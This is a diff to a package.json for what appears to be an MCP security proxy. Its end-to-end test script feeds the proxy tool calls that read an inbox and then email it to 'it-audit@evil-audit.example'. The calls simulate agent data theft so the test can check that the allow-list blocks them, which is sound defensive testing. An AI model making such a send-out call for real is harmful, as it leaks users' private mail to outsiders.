@@ -19,13 +19,12 @@
     "build": "vite build",
     "preview": "vite preview --port 4319",
     "proxy": "tsx scripts/mcp-proxy.ts",
-    "e2e:proxy": "L=$(mktemp -t trifecta-audit) && printf '%s\\n' '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\"}' '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"read_inbox\",\"arguments\":{}}}' '[{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"send_email\",\"arguments\":{\"to\":\"it-audit@evil-audit.example\",\"body\":\"x\"}}}]' 'not json' | tsx scripts/mcp-proxy.ts --allow '*.town.gov' --log $L -- node tests/fixtures/fake-mcp-server.mjs && tsx scripts/verify-audit.ts $L",
+    "e2e:proxy": "L=$(mktemp -t trifecta-audit) && printf '%s\\n' '{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\"}' '{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"read_inbox\",\"arguments\":{}}}' '[{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"tools/call\",\"params\":{\"name\":\"send_email\",\"arguments\":{\"to\":\"it-audit@evil-audit.example\",\"body\":\"x\"}}}]' 'not json' | TRIFECTA_AUDIT_KEY=e2e-demo-key tsx scripts/mcp-proxy.ts --allow '*.town.gov' --log $L -- node tests/fixtures/fake-mcp-server.mjs && TRIFECTA_AUDIT_KEY=e2e-demo-key tsx scripts/verify-audit.ts $L",
     "bench:perf": "tsx scripts/bench-perf.ts"
   },
   "devDependencies": {
     "@types/node": "^26.6.4",
     "playwright": "^1.63.0",
-    "pptxgenjs": "^4.0.1",
     "tsx": "^4.23.15",
     "typescript": "^7.0.2",
     "vite": "^8.3.2",
